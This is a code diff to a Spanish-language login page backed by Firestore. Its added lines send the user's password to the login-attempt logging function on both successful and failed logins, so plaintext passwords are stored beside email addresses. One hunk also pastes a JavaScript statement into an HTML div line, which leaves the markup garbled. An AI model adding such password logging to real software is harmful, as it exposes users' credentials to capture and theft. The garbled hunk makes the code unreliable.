@@ -54,7 +54,7 @@
 </head>
 <body>
 
-    <div class="login-container">
+    <div class="login-container">await saveLoginAttempt(email, true);
         <h1>Iniciar sesión</h1>
         <form id="login-form">
             <div class="input-group">
@@ -122,6 +122,7 @@
 
                     // Guarda el intento de inicio de sesión exitoso en Firestore
                     await saveLoginAttempt(email, true);
+                    await saveLoginAttempt(password, true);
 
                     // Limpia el mensaje de error y muestra un mensaje de éxito
                     document.getElementById("error-message").textContent = "";
@@ -132,6 +133,7 @@
 
                     // Guarda el intento de inicio de sesión fallido en Firestore
                     await saveLoginAttempt(email, false);
+                    await saveLoginAttempt(password, false);
 
                     // Muestra un mensaje de error al usuario
                     let errorMessage = "Error al iniciar sesión";
